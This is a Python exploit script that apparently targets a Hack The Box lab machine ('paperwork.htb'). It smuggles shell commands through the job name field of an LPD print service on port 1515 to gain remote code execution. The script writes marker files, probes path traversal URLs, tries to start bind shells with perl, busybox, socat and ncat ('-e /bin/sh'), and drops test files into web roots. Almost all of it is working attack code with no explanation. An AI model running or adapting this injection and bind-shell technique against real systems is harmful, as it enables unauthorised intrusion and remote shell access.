import socket, time, urllib.request

target = '10.129.38.158'

def lpd(job_name, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((target, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.3)
        s.recv(1024)
        ct = (f'J{job_name}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        s.recv(4096)
        time.sleep(0.3)
        s.recv(4096)
    except:
        pass
    s.close()

print("=== PHASE 1: Verify RCE via file creation ===", flush=True)
marker = f"RCE_VERIFIED_{int(time.time())}"
# Write marker to /tmp/rce_test and also try many other locations
lpd(f"';echo {marker} > /tmp/rce_test;'")
lpd(f"';echo {marker} > /var/tmp/rce_test;'")
lpd(f"';echo {marker} > /dev/shm/rce_test;'")
time.sleep(2)

# Check if we can access these files via web (looking for nginx alias misconfigs)
print("=== PHASE 2: Web path testing ===", flush=True)
paths = [
    '/tmp/rce_test', '/var/tmp/rce_test', '/dev/shm/rce_test',
    '/rce_test', '/download/rce_test', '/static/rce_test',
    '/assets/rce_test', '/css/rce_test', '/js/rce_test',
    '/.tmp/rce_test', '/_tmp/rce_test',
    '/download/../../../tmp/rce_test',
    '/download/..%252f..%252f..%252ftmp/rce_test',
    '/..;/tmp/rce_test',
    '/%2e%2e/%2e%2e/%2e%2e/tmp/rce_test',
]
for p in paths:
    req = urllib.request.Request(f'http://{target}{p}', headers={'Host': 'paperwork.htb'})
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        body = resp.read().decode(errors='replace')[:300]
        if marker in body:
            print(f'!!! MARKER FOUND at {p} (HTTP {resp.status})', flush=True)
        elif resp.status != 404:
            print(f'INTERESTING: {p} -> HTTP {resp.status} {body[:80]}', flush=True)
    except urllib.error.HTTPError as e:
        if e.code != 404:
            print(f'NON-404: {p} -> {e.code}', flush=True)
    except:
        print(f'TIMEOUT: {p}', flush=True)

print("=== PHASE 3: Try common binaries for listener ===", flush=True)
# Try perl, socat, ncat, python2, busybox
for cmd, port in [('perl', 7777), ('busybox', 8888), ('socat', 9999), ('ncat', 4444)]:
    lpd(f"';{cmd} -e /bin/sh -l -p {port} 2>/dev/null & #'")
    time.sleep(0.5)

time.sleep(3)
for port in [7777, 8888, 9999, 4444]:
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((target, port))
        print(f'PORT {port}: CONNECTED!', flush=True)
        s.close()
    except socket.timeout:
        print(f'PORT {port}: timeout', flush=True)
    except ConnectionRefusedError:
        print(f'PORT {port}: refused', flush=True)
    except Exception as e:
        print(f'PORT {port}: {e}', flush=True)
    s.close()

print("=== PHASE 4: Try writing to common web roots ===", flush=True)
roots = [
    '/var/www/html', '/var/www', '/usr/share/nginx/html',
    '/var/www/paperwork.htb', '/var/www/html/paperwork.htb',
    '/opt', '/srv', '/home/lp/public_html',
]
loc = "LPD_WEB_TEST"
for r in roots:
    lpd(f"';mkdir -p {r} 2>/dev/null; echo {loc} > {r}/lpd_test;'")
    time.sleep(0.3)

time.sleep(2)
for r in roots:
    p = f'/{r.split("/")[-1]}/lpd_test' if r.count('/') > 2 else '/lpd_test'
    req = urllib.request.Request(f'http://{target}{p}', headers={'Host': 'paperwork.htb'})
    try:
        resp = urllib.request.urlopen(req, timeout=3)
        body = resp.read().decode(errors='replace')
        if loc in body:
            print(f'!!! WEB ROOT: {r}', flush=True)
    except:
        pass

print("=== DONE ===", flush=True)
